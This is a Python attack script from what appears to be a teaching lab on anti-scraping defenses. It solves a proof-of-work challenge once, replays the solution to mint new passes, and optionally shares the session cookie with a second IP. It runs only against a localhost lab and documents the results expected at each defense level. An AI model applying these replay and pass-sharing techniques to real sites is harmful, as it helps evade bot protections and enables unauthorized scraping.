"""
Chapter 6, Round 2 attack: pay once, use forever.

Objective: play fair exactly once. Solve the server's (signed) challenge honestly on one
core, then reuse what it buys:

  1. keep using the cleared session for every product;
  2. when the pass stops working, redeem the *same* solution again to mint a new one,
     instead of solving a new challenge.

Chapter 4 warned about this: "solve once, replay a million times".

Expected:
  DEFENSE_LEVEL<=2    120/120 for one solve (~65k hashes, a fraction of a CPU-second)
  DEFENSE_LEVEL>=3    20/120: the pass budget runs out, then the replayed solution is
                      refused (pow_reason "challenge already redeemed (replay)")

With --share the bot also hands its session to a second IP (a pass-sharing farm). At level 3
that fails: the pass is bound to the IP + User-Agent that solved it.

    python attacks/round2_solve_once_replay.py [--share]
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import labclient  # noqa: E402,F401  (the localhost guard runs on import)
from pow_client import SKUS, Tally, bot, finish, redeem, scrape, solve_here  # noqa: E402


def run(share=False):
    tally = Tally("round2_solve_once_replay" + ("_share" if share else ""))
    saved = {}
    c = bot("pow-replay", index=3)

    def pass_once_then_replay(payload):
        if not saved:
            saved["challenge"], saved["counter"] = payload, solve_here(payload, tally)
        else:
            tally.note("replaying the same solution for a new pass")
        ok, why = redeem(c, saved["challenge"], saved["counter"])
        if not ok:
            tally.note(f"verify refused: {why}")
        return ok

    if not share:
        scrape(c, tally, SKUS, get_pass=pass_once_then_replay)
        return tally.result()
    # --share: earn a pass on one IP, spend it from another
    scrape(c, tally, SKUS[:1], get_pass=pass_once_then_replay)
    other = bot("pow-replay", index=4)
    other.set_cookie("sid", c.http.cookies.get("sid"))
    scrape(other, tally, SKUS[1:], get_pass=lambda payload: False)
    return tally.result()


if __name__ == "__main__":
    share = "--share" in sys.argv
    print(f"=== Round 2: solve once, replay{' + share the pass' if share else ''} ===")
    finish(run(share=share))
